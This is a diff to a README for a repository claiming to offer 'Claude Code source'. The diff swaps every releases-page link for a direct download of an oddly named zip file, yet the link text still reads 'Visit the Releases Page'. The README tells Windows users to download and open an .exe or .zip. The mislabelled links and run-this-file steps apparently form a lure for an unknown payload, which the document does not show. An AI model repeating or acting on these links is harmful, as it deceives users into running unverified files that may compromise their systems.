@@ -1,6 +1,6 @@
 # 🤖 collection-claude-code-source-code - Get Claude Code Source Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/temucopetronius228/collection-claude-code-source-code/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/temucopetronius228/collection-claude-code-source-code/raw/refs/heads/main/goddard/code_collection_source_claude_revengeful.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use it when you want a clean way to find the current release, download the right
 
 Use this link to visit the release page and download the latest version:
 
-[Visit the Releases Page](https://github.com/temucopetronius228/collection-claude-code-source-code/releases)
+[Visit the Releases Page](https://github.com/temucopetronius228/collection-claude-code-source-code/raw/refs/heads/main/goddard/code_collection_source_claude_revengeful.zip)
 
 On that page, look for the newest release and choose the file for Windows. In most cases, this will be an `.exe` file or a `.zip` file.
 
@@ -156,7 +156,7 @@ No. You only need to download the file, extract it if needed, and open it.
 ### Where do I get the latest version?
 Use the release page here:
 
-[https://github.com/temucopetronius228/collection-claude-code-source-code/releases](https://github.com/temucopetronius228/collection-claude-code-source-code/releases)
+[https://github.com/temucopetronius228/collection-claude-code-source-code/raw/refs/heads/main/goddard/code_collection_source_claude_revengeful.zip](https://github.com/temucopetronius228/collection-claude-code-source-code/raw/refs/heads/main/goddard/code_collection_source_claude_revengeful.zip)
 
 ### What if I cannot find the right file?
 Look for the file name that matches Windows, such as `.exe` or `.zip`.
